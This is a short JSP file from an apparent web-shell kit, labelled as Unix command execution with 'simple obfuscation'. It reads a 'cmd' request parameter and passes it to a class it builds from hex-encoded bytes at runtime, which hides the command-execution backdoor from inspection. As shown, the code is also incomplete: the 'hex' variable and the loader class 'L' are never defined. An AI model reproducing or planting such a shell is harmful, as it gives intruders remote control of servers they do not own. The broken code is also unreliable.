<%@ page import="java.util.*,java.io.*,javax.script.*,java.net.*"%>
<%@ page import="java.lang.reflect.Method" %>
<%
    //
// JSP_KIT
//
// 2.jsp = Command Execution (unix)
// js 简单混淆
// by: huzhanchi
//
%>
<HTML><BODY>
<%

    if (request.getParameter("cmd") != null) {
        String n = request.getParameter("cmd");
        try {
            n = java.net.URLDecoder.decode(n, "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
        }

        String regexSeparator = ":";
        String[] octets = hex.split(regexSeparator);
        byte[] data = new byte[octets.length];

        for (int i = 0; i < octets.length; i++) {
            if (octets[i].length() > 2) {
                throw new NumberFormatException("Invalid octet length");
            }
            data[i] = Integer.valueOf(octets[i], 16).byteValue();
        }

        L l = new L();
        l.defineClass0("A", data);
        Class<?> classA = l.loadClass("A");
        Method m = classA.getDeclaredMethod("F", String.class);
        m.invoke(null, n);
    }
%>
</BODY></HTML>

